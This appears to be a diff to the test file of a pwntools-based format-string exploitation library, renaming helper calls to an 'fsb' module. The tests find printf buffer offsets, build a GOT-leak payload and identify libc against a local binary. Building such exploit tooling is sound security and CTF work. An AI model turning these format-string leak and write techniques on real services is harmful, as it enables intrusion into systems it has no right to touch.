@@ -20,7 +20,7 @@ class BinTests(ut.TestCase):
                 return r.recvline()
             
             # Let's say we want to write to s[56]. We first find the printf() offset to s[]:
-            offset = find_printf_offset_buffer(printf)
+            offset = fsb.find_offset.buffer(printf)
             
             # Then, make use of pwntools' fmtstr library to write to there:
             r = context.binary.process()
@@ -49,16 +49,16 @@ class BinTests(ut.TestCase):
                 r = process(**proc)
                 r.send(l)
                 return r.recvline()
-            buf_off = find_printf_offset_buffer(printf)
+            buf_off = fsb.find_offset.buffer(printf)
 
             # send a printf GOT table leak exploit
             r = process(**proc)
-            payload = leak_printf_deref_payload(buf_off, GOT_addrs)
+            payload = fsb.leak.deref_payload(buf_off, GOT_addrs)
             assert len(payload) < 64
             r.sendline(payload)
             
             # grab the leaked addresses and pass them to libc_find() for detection
-            libc_addrs = map(lambda b:extract_first_bytes(b,6),leak_printf_deref_extractor(r.recvall()))
+            libc_addrs = map(lambda b:extract_first_bytes(b,6),fsb.leak.deref_extractor(r.recvall()))
             libc_dict = dict(zip(GOT_table, libc_addrs))
             path_to_libcdb = input("path to libc-database: ").strip()
             assert path.isdir(path_to_libcdb)
